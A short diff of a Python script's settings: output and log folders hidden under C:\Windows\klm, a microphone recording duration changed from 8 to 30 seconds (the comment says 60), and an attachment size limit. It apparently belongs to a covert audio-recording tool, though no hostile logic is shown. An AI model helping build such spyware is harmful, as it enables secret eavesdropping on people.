@@ -10,7 +10,7 @@ from datetime import datetime
 output_directory = "C:\\Windows\\klm\\output"
 log_directory = "C:\\Windows\\klm\\logs"
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-MICROPHONE_DURATION = 8  # Duration of recording, updated to 60 seconds
+MICROPHONE_DURATION = 30  # Duration of recording, updated to 60 seconds
 MAX_ATTACHMENT_SIZE = 5 * 1024 * 1024  # Max size for an attachment
 
 def record_audio():
